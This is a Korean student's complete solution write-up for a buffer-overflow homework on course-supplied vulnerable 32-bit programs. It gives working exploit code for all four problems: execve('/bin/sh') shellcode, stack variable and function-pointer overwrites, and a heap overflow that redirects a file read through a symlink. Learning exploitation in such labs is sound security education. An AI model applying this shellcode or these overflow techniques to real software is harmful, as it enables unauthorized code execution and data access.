# HW1 Buffer Overflow Exploit — 처음부터 끝까지 전체 풀이

---

## 목차

1. [과제 개요](#1-과제-개요)
2. [기초 개념 — Buffer Overflow란?](#2-기초-개념--buffer-overflow란)
3. [환경 준비](#3-환경-준비)
4. [문제 1 — Shellcode Execution](#4-문제-1--shellcode-execution)
5. [문제 2 — Variable Overwrite](#5-문제-2--variable-overwrite)
6. [문제 3 — Function Pointer Overwrite](#6-문제-3--function-pointer-overwrite)
7. [문제 6 — Length Bypass & File Read](#7-문제-6--length-bypass--file-read)
8. [제출 방법](#8-제출-방법)

---

## 1. 과제 개요

**목표:** 32비트 Linux 환경에서 Buffer Overflow 취약점을 분석하고 공격 코드(Exploit)를 작성한다.

배포된 `hw1_student.zip`의 `code/` 폴더 안에는:

```
hackme1.c ~ hackme6.c   ← 취약점이 있는 타깃 프로그램 (수정 금지)
exploit1.c ~ exploit6.c ← 우리가 작성해야 하는 공격 코드 (TODO 부분 완성)
```

각 `exploitN`을 실행하면 페이로드(공격 데이터)를 출력하고,
그 출력을 `hackmeN`에 전달하여 해킹에 성공하면 된다.

**문제 목록:**

| 문제 | 파일 | 목표 |
|------|------|------|
| 1 | exploit1.c / hackme1 | 셸코드를 삽입해 셸(`/bin/sh`) 획득 |
| 2 | exploit2.c / hackme2 | 버퍼 넘쳐서 비밀번호 검증 변수 덮어쓰기 |
| 3 | exploit3.c / hackme3 | 함수 포인터 덮어써서 숨겨진 jackpot 함수 실행 |
| 6 | exploit6.c / hackme6 | 힙 오버플로우 + 심볼릭 링크로 secret.txt 읽기 |

---

## 2. 기초 개념 — Buffer Overflow란?

### 버퍼(Buffer)

메모리에 데이터를 임시로 저장하는 공간. 예를 들어 `char name[8]`은 8바이트짜리 버퍼다.

### 오버플로우(Overflow)

버퍼의 크기를 초과해 데이터를 쓰면, 버퍼 바로 뒤의 메모리가 덮어써진다.

```
버퍼 크기: 8바이트
입력값:    "AAAAAAAAAAAAAAAA" (16바이트)

메모리:
┌─────────────┬─────────────┐
│  name[8]    │  다음 변수  │
│ AAAAAAAA    │ AAAAAAAA    │ ← 원래 값이 'A'로 덮어써짐!
└─────────────┴─────────────┘
```

`strcpy`, `scanf("%s", ...)` 같은 함수는 길이 체크를 하지 않아서 이런 취약점이 발생한다.

### 스택(Stack) 메모리 구조

함수가 호출되면 스택에 다음과 같이 메모리가 쌓인다.

```
높은 주소
┌──────────────────┐
│   이전 함수 영역  │
├──────────────────┤
│  Return Address  │ ← 함수가 끝나면 돌아갈 주소
├──────────────────┤
│   Saved EBP      │
├──────────────────┤
│   지역 변수들    │ ← 여기에 버퍼도 포함됨
└──────────────────┘
낮은 주소         ← 버퍼는 낮은 주소에서 높은 주소 방향으로 채워짐
```

버퍼를 넘치게 쓰면 **위쪽(높은 주소)에 있는 변수나 Return Address를 덮어쓸 수 있다.**

### 힙(Heap) 메모리

`malloc()`으로 동적 할당하는 메모리 영역. 연속으로 할당하면 메모리에 순서대로 붙어 배치된다.

---

## 3. 환경 준비

### 배경: 왜 hackme 바이너리를 재컴파일해야 했나?

배포된 hackme 바이너리들이 **64비트**로 빌드되어 있었다.

```bash
file hackme2
# hackme2: ELF 64-bit LSB pie executable ...
```

과제는 **32비트(x86) 환경 기준**이라 exploit도 `-m32`로 컴파일한다.
64비트 hackme에 32비트 exploit을 쏘면 스택/힙 구조가 달라져 오프셋이 맞지 않으므로,
**로컬 테스트를 위해** hackme를 32비트로 재컴파일했다.

> **중요:** hackme **소스코드(.c)는 수정하지 않았다.** 바이너리만 다시 컴파일한 것이다.
> 채점은 조교 원본 환경(32비트)에서 진행되므로 제출에는 영향이 없다.

### 32비트 라이브러리 설치 확인

```bash
dpkg -l | grep gcc-multilib
# ii  gcc-multilib ... ← 설치되어 있으면 OK
```

없으면:
```bash
sudo apt install gcc-multilib libc6-dev-i386
```

### hackme 바이너리 32비트로 재컴파일

```bash
cd hw1_student/code

FLAGS="-m32 -O0 -fno-stack-protector -fno-pie -no-pie -g -z execstack"
gcc hackme1.c -o hackme1 $FLAGS
gcc hackme2.c -o hackme2 $FLAGS
gcc hackme3.c -o hackme3 $FLAGS
gcc hackme6.c -o hackme6 $FLAGS
```

확인:
```bash
file hackme2
# hackme2: ELF 32-bit LSB executable, Intel 80386 ...  ← 이렇게 나와야 함
```

### ASLR (주소 무작위화)

```bash
cat /proc/sys/kernel/randomize_va_space
# 2 ← 기본값. 켜져 있음
```

이번 과제는 ASLR이 켜져 있어도 모두 동작한다 (이유는 각 문제 풀이에서 설명).
건드리지 않아도 된다.

---

## 4. 문제 1 — Shellcode Execution

### 타깃 분석: hackme1.c

```c
int main(void)
{
    char shellcode[] = "";
    (*(void (*)()) shellcode)();  // shellcode 배열을 함수처럼 실행
    return 0;
}
```

`shellcode[]` 배열에 있는 바이트들을 그대로 **기계어 코드로 실행**한다.
즉, 배열 안에 원하는 기계어 명령어를 넣으면 그게 실행된다.

`exploit1.c`도 구조가 동일하다. 여기에 `/bin/sh`를 실행하는 기계어(셸코드)를 넣으면 셸을 획득한다.

### 셸코드란?

셸코드(Shellcode)는 **특정 동작을 수행하는 기계어 바이트 배열**이다.
우리 목표는 `execve("/bin/sh", NULL, NULL)` 시스콜을 호출하는 셸코드를 만드는 것.

32비트 Linux에서 `execve` 시스콜 호출 방법:

```
eax = 11 (0x0b)         ← execve 시스콜 번호
ebx = "/bin/sh" 주소    ← 실행할 프로그램
ecx = argv 포인터       ← 인자 배열
edx = envp 포인터       ← 환경변수 배열
int 0x80                ← 시스콜 실행
```

### 문제: "/bin/sh" 주소를 어떻게 알까?

셸코드는 메모리 어딘가에 로드되는데, 로드될 주소를 미리 알 수 없다.
`"/bin/sh"` 문자열을 셸코드 안에 포함시키되, **실행 시점에 그 주소를 알아내야** 한다.

### 해결: JMP-CALL-POP 기법

`call` 명령어의 특성을 이용한다:
> `call` 명령어는 다음 명령어의 주소를 스택에 push한 뒤 점프한다.

```
                   ┌─────────────────────────────────────────────────┐
                   │                                                 │
[jmp→get_string]   [run_shell 코드...]   [ret]   [call→run_shell]   ["/bin/shXAAAABBBB"]
  offset 0          offset 2                      offset 25          offset 30
                                                        │                  ↑
                                                        └──────────────────┘
                                          call이 실행되면 offset 30의 주소가 스택에 push됨
```

**실행 흐름:**

```
1. offset 0:  jmp get_string         → offset 25로 점프
2. offset 25: call run_shell         → offset 30의 주소(= "/bin/sh" 위치)를 스택에 push
                                       → offset 2(run_shell)로 점프
3. offset 2:  pop ebx               → 스택에서 꺼내면 ebx = "/bin/sh" 주소!
4.            xor eax, eax           → eax = 0 (null terminator 준비)
5.            mov [ebx+7], al        → "/bin/sh" 뒤의 'X'를 '\0'으로 교체
6.            mov [ebx+8], ebx       → AAAA 위치에 &"/bin/sh" 저장 (argv[0])
7.            mov [ebx+12], eax      → BBBB 위치에 NULL 저장 (argv[1], envp)
8.            mov al, 0x0b           → eax = execve 시스콜 번호
9.            lea ecx, [ebx+8]       → ecx = argv 배열 주소
10.           lea edx, [ebx+12]      → edx = envp 주소
11.           int 0x80               → 시스콜 실행 → /bin/sh 실행!
```

**왜 null 바이트가 없어야 하나?**
문자열 함수들은 `\x00`을 문자열 끝으로 인식해 복사를 멈춘다.
셸코드 중간에 `\x00`이 있으면 잘리기 때문에, null 바이트 없이 설계해야 한다.

### 셸코드 바이트 추출

제공된 `shellcode-creator.c`를 `makeshellcode.sh`로 컴파일/추출:

```bash
bash makeshellcode.sh
# \xeb\x17\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80
```

그런데 이 스크립트는 `ret` 전까지만 추출한다.
`objdump`로 전체 셸코드 바이트를 직접 확인했다:

```bash
gcc -m32 shellcode-creator.c -o shellcode_tmp -O0 -fno-stack-protector -fno-pie -no-pie
objdump -d shellcode_tmp | grep -A 30 "<shellcode>:"
```

```
08049166 <shellcode>:
 8049166: eb 17       jmp    804917f <get_string>

08049168 <run_shell>:
 8049168: 5b          pop    %ebx
 8049169: 31 c0       xor    %eax,%eax
 804916b: 88 43 07    mov    %al,0x7(%ebx)
 804916e: 89 5b 08    mov    %ebx,0x8(%ebx)
 8049171: 89 43 0c    mov    %eax,0xc(%ebx)
 8049174: b0 0b       mov    $0xb,%al
 8049176: 8d 4b 08    lea    0x8(%ebx),%ecx
 8049179: 8d 53 0c    lea    0xc(%ebx),%edx
 804917c: cd 80       int    $0x80
 804917e: c3          ret

0804917f <get_string>:
 804917f: e8 e4 ff ff ff   call 8049168 <run_shell>
 8049184: 2f 62 69 6e ...  "/bin/shXAAAABBBB"
```

전체 셸코드 = `jmp` + `run_shell 코드` + `ret` + `call` + `"/bin/shXAAAABBBB"`

### 최종 코드 (exploit1.c)

```c
#include <stdio.h>

int main(void)
{
    char shellcode[] =
        "\xeb\x17"              // jmp get_string
        "\x5b"                  // pop ebx          (run_shell:)
        "\x31\xc0"              // xor eax, eax
        "\x88\x43\x07"          // mov [ebx+7], al  (null-terminate "/bin/sh")
        "\x89\x5b\x08"          // mov [ebx+8], ebx (argv[0] = &"/bin/sh")
        "\x89\x43\x0c"          // mov [ebx+12], eax(argv[1] = NULL)
        "\xb0\x0b"              // mov al, 11       (execve syscall)
        "\x8d\x4b\x08"          // lea ecx, [ebx+8] (argv)
        "\x8d\x53\x0c"          // lea edx, [ebx+12](envp)
        "\xcd\x80"              // int 0x80
        "\xc3"                  // ret
        "\xe8\xe4\xff\xff\xff"  // call run_shell   (get_string:)
        "/bin/shXAAAABBBB";     // "/bin/sh" + 런타임에 채워질 공간

    (*(void (*)()) shellcode)();

    return 0;
}
```

### 컴파일 & 실행

```bash
gcc -m32 -z execstack -fno-stack-protector -fno-pie -no-pie exploit1.c -o exploit1
./exploit1
# $ ← 셸 프롬프트 획득!
# $ id
# uid=1000(reo) ...
```

### ASLR 영향 없는 이유

JMP-CALL-POP 기법은 **상대 주소**만 사용한다. 셸코드가 메모리 어느 주소에 로드되든
`call`이 push하는 주소는 항상 `"/bin/sh"` 문자열을 정확히 가리킨다.

---

## 5. 문제 2 — Variable Overwrite

### 타깃 분석: hackme2.c

```c
int check_password(char *password) {
    struct password_state {
        char password_buffer[16];   // 16바이트 버퍼
        int  correct;               // 바로 뒤에 인증 변수
    } state;

    state.correct = 0;              // 초기값 0 (false)
    strcpy(state.password_buffer, password);  // 길이 체크 없음!

    if (strcmp(state.password_buffer, "actualpw") == 0) {
        state.correct = 1;
    }

    return state.correct;           // 0이면 실패, 1이면 성공
}
```

`strcmp`로 비교해서 `"actualpw"`가 아니면 `correct`가 0 그대로다.
그런데 `strcpy`가 길이 체크를 안 하므로, **16바이트를 초과하면 `correct`를 덮어쓸 수 있다.**

### GDB로 메모리 오프셋 확인

```bash
gdb ./hackme2
(gdb) disas check_password
```

```
lea  -0x1c(%ebp), %eax    ← password_buffer의 주소 = ebp - 28 (0x1c)
movl $0x0, -0xc(%ebp)     ← correct의 주소 = ebp - 12 (0x0c)
```

- `password_buffer` 위치: `ebp - 0x1c` (28)
- `correct` 위치:         `ebp - 0x0c` (12)
- **거리: 28 - 12 = 16바이트**

구조체 정의(`char[16]` + `int`)와 정확히 일치한다.

### 스택 구조와 공격 계획

```
낮은 주소
┌─────────────────────┐  ebp - 0x1c (= -28)
│  password_buffer[0] │  ← strcpy 복사 시작점
│  password_buffer[1] │
│        ...          │
│ password_buffer[15] │  ← 여기까지 16바이트
├─────────────────────┤  ebp - 0x0c (= -12)
│  correct (4바이트)  │  ← 여기를 덮어써야 함!
└─────────────────────┘
높은 주소
```

**페이로드:** `"A" × 16` + `"\x01"`

- `"A" × 16` → `password_buffer`를 꽉 채움
- `"\x01"` → `correct`의 첫 번째 바이트에 1이 들어감
- `strcpy`가 자동으로 붙이는 `\x00`(null terminator) → `correct`의 두 번째 바이트에 들어감
- 결과: `correct = 0x00000001 = 1` → `if(correct)` 조건 통과!

### 최종 코드 (exploit2.c)

```c
#include <stdio.h>

int main()
{
    // password_buffer[16] 채우기 + correct(int) 덮어쓰기
    // ebp-0x1c(buffer) ~ ebp-0xc(correct) = 16바이트 패딩
    printf("AAAAAAAAAAAAAAAA"  // 16바이트: password_buffer 가득 채움
           "\x01");            // correct의 첫 바이트를 1로 덮어씀

    return 0;
}
```

### 컴파일 & 실행

```bash
gcc -m32 -O0 -fno-pie -no-pie exploit2.c -o exploit2
./hackme2 $(./exploit2)
# Password correct.  ← 성공!
```

`$(./exploit2)` — exploit2의 출력을 hackme2의 커맨드라인 인자로 전달.

### ASLR 영향 없는 이유

같은 함수 내 변수들의 **상대 거리(16바이트)**는
ASLR로 스택 기준 주소가 바뀌어도 변하지 않는다.

---

## 6. 문제 3 — Function Pointer Overwrite

### 타깃 분석: hackme3.c

```c
void jackpot() {
    printf("$$$ You hit the jackpot!!! $$$\n...");
}

void play() { /* 랜덤 게임 */ }

int main() {
    struct player_state {
        char name[8];           // 8바이트 버퍼
        void (*functionptr)();  // 바로 뒤에 함수 포인터
    } player;

    player.functionptr = &play;  // 초기값: play 함수
    scanf("%s", player.name);    // 길이 체크 없음!
    player.functionptr();        // 덮어쓴 주소를 실행!
}
```

`name[8]`을 넘쳐서 바로 뒤의 `functionptr`을 `jackpot` 함수 주소로 덮으면
`player.functionptr()` 호출 시 `jackpot()`이 실행된다.

### GDB로 메모리 오프셋 확인

```bash
gdb ./hackme3
(gdb) disas main
```

```
lea   -0x14(%ebp), %eax         ← name 주소 = ebp - 20 (0x14)
movl  $0x80491df, -0xc(%ebp)    ← functionptr 주소 = ebp - 12 (0x0c), 초기값 = play 주소
```

- `name` 위치:        `ebp - 0x14` (20)
- `functionptr` 위치: `ebp - 0x0c` (12)
- **거리: 20 - 12 = 8바이트**

### jackpot 함수 주소 확인

```bash
nm -n ./hackme3 | grep jackpot
# 080491c6 T jackpot
```

바이너리가 `-fno-pie -no-pie`로 컴파일되어 **주소가 고정**되어 있다.

### 스택 구조와 공격 계획

```
낮은 주소
┌─────────────────┐  ebp - 0x14 (= -20)
│   name[0]       │  ← scanf 입력 시작
│   name[1]       │
│      ...        │
│   name[7]       │  ← 여기까지 8바이트
├─────────────────┤  ebp - 0x0c (= -12)
│  functionptr    │  ← 원래 play() 주소, 여기를 덮어써야 함!
│  (4바이트)      │
└─────────────────┘
높은 주소
```

**페이로드:** `"A" × 8` + `jackpot 주소 (4바이트, little-endian)`

jackpot 주소 `0x080491c6`을 little-endian으로 쓰면: `\xc6\x91\x04\x08`

### little-endian이란?

x86은 숫자를 **낮은 바이트부터** 메모리에 저장한다.

```
주소 0x080491c6 → 메모리에: c6 91 04 08
                             ↑낮은바이트     높은바이트↑
```

### exploit3.c에 이미 있는 도우미 함수 활용

배포된 `exploit3.c`에 `read_jackpot_address()`가 제공되어 있다.
이 함수는 `nm` 명령으로 **실행 시마다 jackpot 주소를 자동으로 읽어온다.**

```c
static uint32_t read_jackpot_address(void) {
    FILE *stream = popen("nm -n ./hackme3 | awk '/ jackpot$/{print $1}'", "r");
    // ... (주소를 읽어서 반환)
}
```

이 덕분에 주소가 변해도 항상 정확한 값을 사용할 수 있다.

### 최종 코드 (exploit3.c)

```c
#include <stdint.h>
#include <stdio.h>
// ... (read_jackpot_address 함수는 그대로 유지)

int main(int argc, char *argv[])
{
    // name[8] 채우기 + functionptr 덮어쓰기
    // ebp-0x14(name) ~ ebp-0xc(functionptr) = 8바이트 패딩
    uint32_t addr = read_jackpot_address();
    printf("AAAAAAAA");           // 8바이트: name 버퍼 가득 채움
    fwrite(&addr, 4, 1, stdout);  // jackpot 주소(4바이트 little-endian)
    printf("\n");                 // scanf가 읽기를 멈추도록 개행

    return 0;
}
```

### 컴파일 & 실행

```bash
gcc -m32 -O0 -fno-pie -no-pie exploit3.c -o exploit3
./exploit3 | ./hackme3
# $$$ You hit the jackpot!!! $$$  ← 성공!
```

`./exploit3 | ./hackme3` — exploit3의 출력을 파이프로 hackme3의 stdin에 전달.
hackme3이 `scanf`로 읽을 때 우리 페이로드를 읽는다.

### ASLR 영향 없는 이유

- `name`과 `functionptr`의 **상대 거리(8바이트)**는 ASLR과 무관하다.
- jackpot 주소는 `-no-pie` 덕분에 고정이고, `read_jackpot_address()`가 동적으로 읽어온다.

---

## 7. 문제 6 — Length Bypass & File Read

### 타깃 분석: hackme6.c

```c
struct file { int id; char filename[8]; };   // 파일 정보 구조체
struct user { int id; char name[8];     };   // 유저 정보 구조체

int main(int argc, char **argv) {
    struct user *userptr = malloc(sizeof(struct user));  // 힙에 할당
    struct file *fileptr = malloc(sizeof(struct file));  // 힙에 바로 다음 할당

    fileptr->id = 1;
    strcpy(fileptr->filename, "public.txt");   // 열 파일 초기화

    userptr->id = 1;
    strcpy(userptr->name, argv[1]);            // 길이 체크 없음!

    FILE *readfile = fopen(fileptr->filename, "r");  // 이 파일을 열어서 출력
    // ... 파일 내용 출력
}
```

`userptr->name`을 넘치게 쓰면 힙에서 바로 뒤에 있는 `fileptr->filename`을 덮어쓸 수 있다.
`fileptr->filename`을 `"secret.txt"`로 바꾸면 `fopen`이 그 파일을 열게 된다.

### 힙 메모리 레이아웃 확인

```bash
gdb ./hackme6
(gdb) break hackme6.c:44
(gdb) run AAAA
(gdb) p &userptr->name       # 0x804d1a4
(gdb) p &fileptr->filename   # 0x804d1b4
```

**`&userptr->name`에서 `&fileptr->filename`까지의 거리: 16바이트**

```
낮은 주소
                          0x804d1a0  userptr
┌──────────────────────┐
│ userptr->id (4바이트) │
├──────────────────────┤  0x804d1a4  ← strcpy 시작점 (name)
│ userptr->name (8바이트)│
├──────────────────────┤  0x804d1ac
│ malloc 메타데이터 등  │  (4바이트)
│ (fileptr 청크 헤더)  │
├──────────────────────┤  0x804d1b0  fileptr
│ fileptr->id (4바이트) │
├──────────────────────┤  0x804d1b4  ← 목표: filename 덮어쓰기
│ fileptr->filename    │  원래: "public.txt"
│ (8바이트)            │
└──────────────────────┘
높은 주소
```

16바이트를 쓰면 `fileptr->filename` 시작 위치에 도달한다.

### 길이 제한 문제

`filename` 필드는 8바이트인데, `"secret.txt"`는 **10글자 + null = 11바이트**로 들어가지 않는다.

```
filename[8]:  s e c r e t . t ← 여기까지만 들어감, 't'와 'x'가 잘림
```

또한 `"secret.txt"` 자체를 인자로 전달하면 총 16 + 10 = 26바이트가 필요해 구조가 더 복잡해진다.

### 해결책: 심볼릭 링크 활용

```bash
ln -s secret.txt s   # "s" → "secret.txt" 링크 생성
```

이제 `fopen("s", "r")`은 실제로 `secret.txt`를 연다.
파일명 `"s"`는 **단 1글자**이므로 filename 필드에 문제없이 들어간다.

**페이로드:** `"A" × 16` + `"s"`

- `"A" × 16` → name + 중간 메타데이터 + fileptr->id 영역 통과
- `"s"` → `fileptr->filename`에 기록

### 최종 코드 (exploit6.c)

```c
#include <stdio.h>

int main()
{
    // 사전 준비: ln -s secret.txt s  (최초 1회 실행)
    // &userptr->name ~ &fileptr->filename = 16바이트
    printf("AAAAAAAAAAAAAAAA"   // 16바이트 패딩
           "s");                // fileptr->filename = "s" (심볼릭 링크)

    return 0;
}
```

### 컴파일 & 실행

```bash
# 심볼릭 링크 생성 (최초 1회)
ln -s secret.txt s

# 컴파일
gcc -m32 -O0 -fno-pie -no-pie exploit6.c -o exploit6

# 실행
./hackme6 $(./exploit6)
# Welcome, user AAAAAAAAAAAAAAAAs!
# On an unrelated note, opening s.
# File was successfully opened. It contains:
# super secret information!   ← 성공!
```

### ASLR 영향 없는 이유

힙에서 연속으로 `malloc`한 두 구조체의 **상대 거리(16바이트)**는
ASLR로 힙 기준 주소가 바뀌어도 변하지 않는다.

---

## 8. 제출 방법

### 전체 컴파일 한 번에 하기

```bash
cd hw1_student/code
bash compile-all.sh
```

또는 개별로:

```bash
# 문제 1 (스택 실행 권한 필요)
gcc -m32 -z execstack -fno-stack-protector -fno-pie -no-pie exploit1.c -o exploit1

# 문제 2, 3, 6
gcc -m32 -O0 -fno-pie -no-pie exploit2.c -o exploit2
gcc -m32 -O0 -fno-pie -no-pie exploit3.c -o exploit3
gcc -m32 -O0 -fno-pie -no-pie exploit6.c -o exploit6
```

### 최종 동작 확인

```bash
# 문제 1
./exploit1
# → $ 프롬프트 (셸 획득)

# 문제 2
./hackme2 $(./exploit2)
# → Password correct.

# 문제 3
./exploit3 | ./hackme3
# → $$$ You hit the jackpot!!! $$$

# 문제 6 (심볼릭 링크 필요)
ln -s secret.txt s
./hackme6 $(./exploit6)
# → super secret information!
```

### 제출 파일 목록

```
exploit1.c   ← 문제 1
exploit2.c   ← 문제 2
exploit3.c   ← 문제 3
exploit6.c   ← 문제 6
+ 각 문제 성공 화면 스크린샷 (터미널 닉네임/환경 포함)
```

위 파일들을 `학번_이름.zip`으로 묶어 LMS에 제출한다.

> **주의:** `hackme*.c`, `secret.txt`는 절대 수정하지 말 것. 채점은 조교 원본 환경에서 진행된다.
